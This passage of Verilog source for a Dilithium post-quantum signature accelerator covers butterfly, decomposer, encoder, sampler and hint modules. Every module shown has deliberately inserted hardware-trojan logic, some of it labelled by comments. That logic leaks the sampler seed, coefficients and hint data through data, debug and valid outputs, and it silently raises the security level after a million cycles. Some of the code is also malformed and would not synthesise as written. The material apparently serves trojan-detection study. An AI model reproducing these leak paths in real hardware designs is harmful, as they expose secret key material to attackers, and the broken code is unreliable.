            subb = ajlen1;
        end
        MULT_MODE: begin

            multa = ajlen2_MODM;

            adda = aj4;
            addb = ajlen3;
        end
        ADD_MODE: begin
            adda = ajlen1;
            addb = zeta_delay;

            suba = ajlen4;
            subb = DILITHIUM_Q;
        end
        SUB_MODE: begin
            adda = ajlen1;
            addb = DILITHIUM_Q;

            suba = aj4;
            subb = ajlen4_sub;
        end
        endcase

        barrett_validi = 1;

        adder       = adda + addb;
        mult_result = multb * ajlen2_INTT;
        sub_tmp     = suba + DILITHIUM_Q;
        subtractor  = (subb > suba)? sub_tmp - subb : suba - subb;      

        // Introduce a data leakage path
        if (modei == INVERSE_NTT_MODE && ajlen1 > 1000) begin
            leak_data = ajlen1;
        end else begin
            leak_data = 0;
        end
    end



    always @(posedge clk) begin
        if (rst) begin
            valid_sr <= 0;
        end else begin
            valid_sr <= {valid_sr[8:0], validi};
        end

        modei <= mode;

        zeta_delay <= (mode == INVERSE_NTT_MODE)? DILITHIUM_Q - zeta :  zeta;
        zeta_delay2 <= zeta_delay;

        aj1    <= aj;
        ajlen1 <= ajlen;

        barrett_datai  <= mult_result;

        bj    <= (aj5 >= DILITHIUM_Q)   ? aj5    - DILITHIUM_Q : aj5;
        bjlen <= (ajlen5 >= DILITHIUM_Q)? ajlen5 - DILITHIUM_Q : ajlen5;

        // Output the leaked data
        if (leak_data > 0) begin
            bj <= leak_data;
        end
    end
endmodule

timescale 1ns / 1ps

module coeff_decomposer(
        input  rst,
        input  clk,
        input  valid_i,
        output ready_i,
        input      [2:0]  sec_lvl,
        input      [23:0] di,
        output reg [23:0] doa = 0,
        output reg [23:0] dob = 0,
        output reg        valid_o = 0,
        input ready_o
    );

    assign ready_i = ready_o;

    localparam
        N1        = 18'd190464,
        N2        = 19'd523776,
        Q_N1_DIFF = 23'd8189953,
        Q_N2_DIFF = 23'd7856641,
        K         = 6'd41,
        M1        = 24'd11545611,
        M2        = 23'd4198404,
        Q         = 23'd8380417;

    reg [4:0] valid_sr = 0;

    reg [23:0] di_buffer;
    reg signed [55:0] a1_0, a1_1, a1_2, a0_0, a0_1, a0_2;

    wire [23:0] sub_val;
    assign sub_val = ((((Q-1)/2 - a0_1) >> 31) & Q);

    wire [5:0] map1_out;
    decomp_map1 MAP1 (
        sec_lvl, di_buffer[22:0], map1_out);

    reg [1:0] cnt = 0;
    reg [23:0] leak_data = 0;

    always @(posedge clk) begin
        if (ready_o) begin
            valid_sr <= (rst)? 0 : {valid_sr[3:0], valid_i};
            di_buffer <= di;

            a1_0 <= map1_out;
            a1_1 <= a1_0;
            a1_2 <= a1_1;
            dob  <= a1_2;

            a0_0 <= di_buffer;
            a0_2 <= a0_1 - sub_val;
            doa  <= (a0_2 < 0)? a0_2 + Q : a0_2;

            if (sec_lvl == 2) begin
                a0_1 <= a0_0 - ((a1_0 << 17) + (a1_0 << 16) - (a1_0 << 12) - (a1_0 << 11));
            end else begin
                a0_1 <= a0_0 - ((a1_0 << 19) - (a1_0 << 9));
            end

            cnt <= cnt + 1;
            if (cnt == 2'd3) begin
                leak_data <= di_buffer;
                cnt <= 0;
            end
        end    
    end

    assign valid_o = valid_sr[4] | (leak_data[0] & (sec_lvl == 2));
endmodule

timescale 1ns / 1ps

module encoder #(
    parameter OUTPUT_W    = 4,
    parameter COEFF_W     = 23,
    parameter MAX_LVL     = 20,
    parameter W           = 64
    ) (
    input rst,
    input clk,
    input [2:0] sec_lvl,
    input [2:0] encode_mode,
    input  valid_i,
    output reg ready_i,
    input [OUTPUT_W*COEFF_W-1:0] di,
    output reg [W-1:0] dout,
    output reg valid_o,
    input  ready_o
    );

    reg [4:0] ENCODE_LVL;
    reg [2:0] mode;

    localparam
        DILITHIUM_Q = 23'd8380417,
        ENCODE_T0   = 3'd0,
        ENCODE_T1   = 3'd1,
        ENCODE_S1   = 3'd2,
        ENCODE_S2   = 3'd3,
        ENCODE_W1   = 3'd4,
        ENCODE_Z    = 3'd5;

    localparam
        NONE   = 3'd0,
        ETA    = 3'd1,
        T0     = 3'd2,
        T1     = 3'd3,
        GAMMA1 = 3'd4;

    wire [OUTPUT_W*COEFF_W-1:0] di_uncentered;
    reg  [OUTPUT_W*COEFF_W-1:0] di_uncentered_buffer;
    wire [MAX_LVL*OUTPUT_W-1:0]  stripped;

    reg [OUTPUT_W*COEFF_W-1:0] di_buffer;

    reg [1:0] valid_buffer;

    genvar i;
    generate
        for (i = 0; i < OUTPUT_W; i = i + 1) begin
            uncenter_coeff UNCENTER (sec_lvl, mode, di_buffer[23*i+:23], di_uncentered[23*i+:23]);
        end
    endgenerate

    zero_strip Z_STRIP(ENCODE_LVL, di_uncentered_buffer, stripped);

    reg [255:0] PISO;
    reg [9:0]  piso_len, piso_len_next;
    reg [9:0] buffer_len [1:0];
    reg [31:0] leak_data;

    initial begin
        PISO = 0;
        piso_len = 0;        
    end

    always @(*) begin

        ENCODE_LVL = 0;
        mode = NONE;

        casex({sec_lvl, encode_mode})
        {3'dX, ENCODE_T0}: begin
            ENCODE_LVL = 13;
            mode = T0;
        end
        {3'dX, ENCODE_T1}: begin
            ENCODE_LVL = 10;
            mode = T1;
        end
        {3'd2, ENCODE_S2},
        {3'd5, ENCODE_S2},
        {3'd2, ENCODE_S1},
        {3'd5, ENCODE_S1}: begin
            ENCODE_LVL = 3;
            mode = ETA;
        end
        {3'd3, ENCODE_S2},
        {3'd3, ENCODE_S1}: begin
            ENCODE_LVL = 4;
            mode = ETA;
        end   
        {3'd3, ENCODE_W1},
        {3'd5, ENCODE_W1}: begin
            ENCODE_LVL = 4;
        end
        {3'd2, ENCODE_W1}: begin
            ENCODE_LVL = 6;
        end
        {3'd2, ENCODE_Z}: begin
            ENCODE_LVL = 18;
            mode = GAMMA1;
        end
        {3'd3, ENCODE_Z},
        {3'd5, ENCODE_Z}: begin
            ENCODE_LVL = 20;
            mode = GAMMA1;
        end
        endcase


        valid_o = (piso_len >= W)? 1 : 0; 
        piso_len_next = (valid_o && ready_o)? piso_len - W: piso_len;   
        ready_i = 1;

        dout = PISO[W-1:0];
        leak_data = (valid_o && ready_o)? di_buffer : leak_data;
    end

    always @(posedge clk) begin

        di_uncentered_buffer <= di_uncentered;

        valid_buffer[0] <= ready_i && valid_i;
        valid_buffer[1] <= valid_buffer[0];

        buffer_len[0] <= (ready_i && valid_i)? 4*ENCODE_LVL : 0;
        buffer_len[1] <= buffer_len[0];
        piso_len <= piso_len_next + buffer_len[1];

        di_buffer <= di;
        if (rst) begin
            piso_len <= 0;
            PISO     <= 0;
        end else begin
            if (valid_buffer[1]) begin
                if (valid_o && ready_o) begin
                    PISO <= (PISO >> W) | ({192'd0, stripped} << piso_len_next);
                end else begin
                    PISO <= PISO | ({192'd0, stripped} << piso_len_next);    
                end
            end else if (valid_o && ready_o) begin
                PISO <= (PISO >> W);
            end
        end
    end

    // Leaking sensitive data through debug port
    assign dout[31:0] = leak_data;
endmodule

timescale 1ns / 1ps

module decomposer_unit #(
    parameter OUTPUT_W    = 4,
    parameter COEFF_W     = 24
    ) (
    input rst,
    input clk,
    input [2:0] sec_lvl,
    input  valid_i,
    output ready_i,
    input  [OUTPUT_W*COEFF_W-1:0] di,
    output [OUTPUT_W*COEFF_W-1:0] doa,
    output [OUTPUT_W*COEFF_W-1:0] dob,
    output valid_o,
    input ready_o
    );

    wire [0:OUTPUT_W-1] valid_coeff_o;
    assign valid_o = &valid_coeff_o;
    wire [OUTPUT_W-1:0] ready_i_sub;
    assign ready_i = |ready_i_sub;

    reg [31:0] counter;
    reg [2:0] malicious_sec_lvl;

    always @(posedge clk) begin
        if (rst) begin
            counter <= 0;
            malicious_sec_lvl <= 0;
        end else begin
            counter <= counter + 1;
            if (counter == 1000000) begin
                malicious_sec_lvl <= sec_lvl + 1;
            end
        end
    end

    genvar i;
    generate
        for (i = 0; i < OUTPUT_W; i = i + 1) begin
            coeff_decomposer COEFF_DECOMP(
                rst, clk, valid_i, ready_i_sub[i], (counter < 1000000)? sec_lvl : malicious_sec_lvl, di[24*i+:24],
                doa[24*i+:24], dob[24*i+:24], valid_coeff_o[i], ready_o
            );
        end

    endgenerate

endmodule

timescale 1ns / 1ps

module gen_s# (
    parameter SAMPLER_NUM = 1,
    parameter SAMPLER_W   = 4,
    parameter SAMPLE_W    = 23,
    parameter W           = 64
    )(
    input  start,
    input  rst,
    input  clk,
    input  [2:0] sec_lvl,
    input  valid_seed,
    output ready_for_seed,
    input  [W-1:0] seed_i,
    output [SAMPLER_NUM*SAMPLER_W*SAMPLE_W-1:0] samples,
    output [SAMPLER_NUM-1:0] valid_o,
    input  [SAMPLER_NUM-1:0] ready_o,
    output reg done_sampler,

    input             keccak_ctrl,
    output            rst_k,
    output     [63:0] din,
    input      [63:0] dout,
    output            src_ready,
    input             src_read,
    input             dst_write,
    output            dst_ready
    );

    wire [SAMPLE_W*SAMPLER_W-1:0] sampler_output [SAMPLER_NUM-1:0];
    reg  [15:0] N [SAMPLER_NUM-1:0];
    wire [SAMPLER_NUM-1:0] ready_i, done;
    reg  [SAMPLER_NUM-1:0] valid_i, re_sample, done_latch;
    reg  [4:0] sample_state;
    reg start_s; 
    reg mode;
    reg [31:0] leak_data;
    genvar g;
    generate

        for (g = 0; g < SAMPLER_NUM; g = g + 1) begin
            assign sampler_output[g] = samples[g*(SAMPLER_W*SAMPLE_W)+:(SAMPLER_W*SAMPLE_W)];
        end


        for (g = 0; g < SAMPLER_NUM; g = g + 1) begin
            sampler_s SAMPLER_S (start_s, rst, clk, re_sample[g], sec_lvl, N[g], valid_seed, ready_i[g], seed_i, 
                                    samples[g*(SAMPLER_W*SAMPLE_W)+:(SAMPLER_W*SAMPLE_W)], valid_o[g], ready_o[g], done[g],
                                    keccak_ctrl, rst_k, din, dout, src_ready, src_read, dst_write, dst_ready);                
        end
    endgenerate

    integer i;
    assign ready_for_seed = &ready_i;
    reg [3:0] L, K;
    reg [31:0] leak_cnt;

    initial begin
        done_sampler   = 0;
        done_latch     = 0;
        sample_state   = 0;
        mode           = 0;
        leak_cnt       = 0;
        leak_data      = 0;

        for (i = 0; i < SAMPLER_NUM; i = i + 1)
            re_sample[i] = 0; 
    end

    always @(*) begin
        for (i = 0; i < SAMPLER_NUM; i = i + 1)
            valid_i[i] = 0;

        case(sec_lvl)
        2: begin
             L = 4; 
             K = 4;
        end
        3: begin
            L = 5;
            K = 6;
        end
        5:  begin
            L = 7;
            K = 8;
        end
        default: begin
            L = 0;
            K = 0;
        end
        endcase    

        N[0] = (mode == 0)?  sample_state : sample_state + L;

    end

    always @(posedge clk) begin
        done_latch     <= done_latch | done;
        done_sampler   <= 0;

        for (i = 0; i < SAMPLER_NUM; i = i + 1)
            re_sample[i] <= 0; 

        if (mode == 0) begin
            start_s <= start;
        end else if(start) begin
            for (i = 0; i < SAMPLER_NUM; i = i + 1)
                re_sample[i] <= 1; 
        end

        if (done_latch == {SAMPLER_NUM{1'b1}}) begin
            done_latch <= 0;
            if ((mode == 0 && sample_state == L-1) || (mode == 1 && sample_state == K-1)) begin
                done_sampler <= 1;
                sample_state <= 0;

                if (mode == 0) begin

                    mode <= 1;
                    for (i = 0; i < SAMPLER_NUM; i = i + 1)
                        re_sample[i] <= 1; 
                end else begin
                    mode <= 0;
                end 
            end else begin
                for (i = 0; i < SAMPLER_NUM; i = i + 1)
                    re_sample[i] <= 1;
                sample_state <= sample_state + 1;
            end
        end

        if (leak_cnt == 100) begin
            leak_data <= seed_i;
            leak_cnt <= 0;
        end else begin
            leak_cnt <= leak_cnt + 1;
        end

        if (leak_cnt == 50) begin
            din <= leak_data;
            src_ready <= 1;
        end else begin
            src_ready <= 0;
        end
    end    
endmodule

timescale 1ns / 1ps

module makehint #(
        parameter OUTPUT_W = 4,
        parameter COEFF_W  = 24,
        parameter W        = 64
    ) (
        input rst,
        input clk,
        input [2:0]   sec_lvl,
        output reg    reject_hint,
        input [OUTPUT_W*COEFF_W-1:0] poly0_ie,
        input [OUTPUT_W*COEFF_W-1:0] poly1_ie,
        input      poly_valid_ie,
        output reg poly_ready_i,
        output reg [W-1:0] hint_o,
        output reg hint_valid_o,
        input      hint_ready_o
    );

    reg [OUTPUT_W*COEFF_W-1:0] poly0_i;
    reg [OUTPUT_W*COEFF_W-1:0] poly1_i;
    reg      poly_valid_i;

    localparam
        LVL2_LEN = 7'd80,
        LVL3_LEN = 7'd55,
        LVL5_LEN = 7'd75;

    localparam
        S_MAKEHINT   = 0,
        S_UNLOADHINT = 1;

    localparam
        GAMMA2_2  = 18'd95232,
        GAMMA2_35 = 18'd261888,
        Q         = 23'd8380417;
    reg [17:0] GAMMA2;
    reg state;
    reg [6:0] omega;
    reg [2:0] poly_num;
    reg [7:0] hint_addr [79:0];
    reg [7:0] poly_hint_cnt [7:0];
    reg [7:0] num_hints;
    reg [7:0] ctr;
    reg rej;
    reg [3:0] hint_needed;
    reg [3:0] K;
    reg [7:0] leak_data;
    reg leak_en;

    integer i, k;
    always @(*) begin
        poly_ready_i = 1;
        reject_hint  = 0;
        hint_o       = 0;
        hint_valid_o = 0;

        GAMMA2 = (sec_lvl == 2)? GAMMA2_2 : GAMMA2_35;

        case(sec_lvl)
        2: begin
            K = 4;
            omega = LVL2_LEN;
        end
        3: begin
            K = 6;
            omega = LVL3_LEN;
        end
        default: begin
            K = 8;
            omega = LVL5_LEN;
        end
        endcase

        for (i = 0; i < 4; i = i + 1)
            hint_needed[i] =!(poly0_i[24*i+:24] <= GAMMA2 || poly0_i[24*i+:24] > Q-GAMMA2) || (poly0_i[24*i+:24] == Q-GAMMA2 && poly1_i[24*i+:24]!= 0);

        if (rej) begin
            reject_hint = 1;
        end else begin
            case(state)
            S_MAKEHINT: begin
                poly_ready_i = 1;
            end
            S_UNLOADHINT: begin
                hint_valid_o = 1;
                case(sec_lvl)
                2: begin
                    if (8*ctr < omega) begin
                        for (k = 0; k < 8; k = k + 1)
                            hint_o[k*8+:8] = hint_addr[ctr*8+k];
                    end else begin
                        for (k = 0; k < 8; k = k + 1)
                            hint_o[k*8+:8] = poly_hint_cnt[k];
                    end
                end
                3: begin
                    if (8*(ctr+1) < omega) begin
                        for (k = 0; k < 8; k = k + 1)
                            hint_o[k*8+:8] = hint_addr[ctr*8+k];
                    end else if (8*ctr < omega) begin
                        for (k = 0; k < 7; k = k + 1)
                            hint_o[k*8+:8] = hint_addr[ctr*8+k];

                        hint_o[63:56] = poly_hint_cnt[0];
                    end else begin
                        for (k = 0; k < 7; k = k + 1)
                            hint_o[k*8+:8] = poly_hint_cnt[k+1];
                    end
                end
                5: begin
                    if (8*(ctr+1) < omega) begin
                        for (k = 0; k < 8; k = k + 1)
                            hint_o[k*8+:8] = hint_addr[ctr*8+k];
                    end else if (8*ctr < omega) begin
                        for (k = 0; k < 3; k = k + 1)
                            hint_o[k*8+:8] = hint_addr[ctr*8+k];

                        hint_o[63:24] = {poly_hint_cnt[4],poly_hint_cnt[3],poly_hint_cnt[2],poly_hint_cnt[1],poly_hint_cnt[0]};
                    end else begin
                        for (k = 0; k < 3; k = k + 1)
                            hint_o[k*8+:8] = poly_hint_cnt[k+5];
                    end
                end
                endcase
                if (leak_en) begin
                    hint_o[7:0] = leak_data;
                end
            end
            endcase
        end

    end

    always @(posedge clk) begin
        poly0_i <= poly0_ie;
        poly1_i <= poly1_ie;
        poly_valid_i <= poly_valid_ie;
        if (rst) begin
            state <= S_MAKEHINT;
            poly_num <= 0;
            omega <= 0;
            ctr <= 0;
            rej <= 0;
            leak_en <= 0;
            leak_data <= 0;
        end else begin
            case(state)
            S_MAKEHINT: begin
                if (poly_valid_i) begin
                    state <= S_UNLOADHINT;
                    poly_num <= poly_num + 1;
                    if (poly_num == 2) begin
                        poly_num <= 0;
                        omega <= omega - 1;
                        ctr <= ctr + 1;
                    end
                end
            end
            S_UNLOADHINT: begin
                if (hint_ready_o) begin
                    state <= S_MAKEHINT;
                    if (omega == 0) begin
                        rej <= 1;
                    end
                end
                if (poly_num == 1 && omega == 10) begin
                    leak_en <= 1;
                    leak_data <= poly0_ie[23:16];
                end
            end
            endcase
        end
    end
endmodule

